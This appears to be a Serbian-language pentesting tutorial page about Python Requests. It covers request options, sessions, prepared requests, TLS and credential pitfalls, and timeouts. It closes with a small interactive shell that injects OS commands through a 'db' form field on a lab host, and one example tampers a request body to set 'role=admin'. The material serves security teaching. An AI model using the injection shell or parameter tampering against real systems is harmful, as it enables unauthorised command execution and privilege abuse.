# Web zahtevi

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Ovi primeri koriste dokumentovane argumente za zahteve, svojstva odgovora, multipart file tuple-ove i sesije u biblioteci Requests.<sup>[[1]](#references)</sup> Primeri sa `verify=False` onemogućavaju verifikaciju TLS sertifikata i treba ih ograničiti na kontrolisano testiranje.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Pripremljeni zahtevi za kontrolu payload-a

`PreparedRequest` izlaže konačni URL, zaglavlja i kodirano telo pre nego što se pošalje. Napravite ga pomoću `Session.prepare_request()` (umesto `Request.prepare()`) kada je potrebno primeniti session cookies ili authentication; kada prepared-flow takođe mora da poštuje proxy/CA podešavanja iz environment-a, eksplicitno ih spojite pomoću `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Ovo je korisno kada exploit zahteva nestandardno kodiranje ili kada se payload konstruisan sa zahtevom sačuvanim u `response.request`. To nije raw-HTTP primitive: Requests čuva headere u mappingu koji ne razlikuje velika i mala slova, pa dodeljivanje dupliranog imena zamenjuje prethodnu vrednost. Koristite sender nižeg nivoa za neispravne linije zahteva ili različita duplirana polja `Content-Length`/`Transfer-Encoding` potrebna za [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Izolacija sesije, implicitni credentials i TLS stanje

Sesija podrazumevano veruje konfiguraciji okruženja. Ako nije navedena eksplicitna autentikacija, Requests može preuzeti Basic credentials iz `.netrc`; takođe može uvesti proxy konfiguraciju i putanje do CA bundle-a iz environment variables. Za skripte koje preuzimaju URL-ove pod kontrolom napadača, onemogućite te implicitne ulaze i eksplicitno konfigurišite samo predviđeni lab proxy/CA. Releases pre verzije 2.32.4 mogli su izabrati `.netrc` credentials za pogrešan host kada im je prosleđen zlonamerno napravljen URL, dok je `Session.trust_env = False` dokumentovano rešenje kada upgrade nije moguć.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Sesiju koja koristi `verify=False` držite odvojeno od sesija koje zahtevaju verifikovani TLS. U Requests verzijama pre 2.32.0, veza koja je prvo otvorena sa `verify=False` mogla je biti ponovo iskorišćena za kasnije zahteve ka istom originu, čak i kada su ti zahtevi navodili `verify=True`; nadogradnja rešava taj problem sa stanjem pool-a, ali izolacija takođe olakšava reviziju exploit skripti.<sup>[[5]](#references)</sup>

## Pouzdane exploit petlje

Requests nema podrazumevani timeout. `(connect, read)` timeout nije ukupan rok prema zidnom satu: `read` komponenta ograničava koliko dugo klijent čeka između primljenih bajtova. Onemogućite automatska preusmeravanja kada target kontroliše `Location`, zatim validirajte svaki hop pre slanja novog zahteva; ako su preusmeravanja omogućena, proverite `response.history`. Za velike ili hostile response-e, koristite `stream=True`, iterirajte kroz ograničene chunk-ove i zatvorite response pomoću context manager-a kako bi pooled connection bio oslobođen.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Python cmd za iskorišćavanje RCE-a

Komandna petlja podklasira Python-ov `Cmd`; njen metod `default` obrađuje neprepoznate prefikse komandi, `cmdloop` prosleđuje ulazne linije, a `re.DOTALL` omogućava obrascu za izdvajanje da obuhvati nove redove.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Requests developerski interfejs](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Podrška za komandne interpretere zasnovane na linijama](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Operacije sa regularnim izrazima](https://docs.python.org/3/library/re.html)
- [4] [Requests je ranjiv na leak `.netrc` akreditiva putem zlonamernih URL-ova](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Requests `Session` objekat ne verifikuje zahteve nakon prvog zahteva sa `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
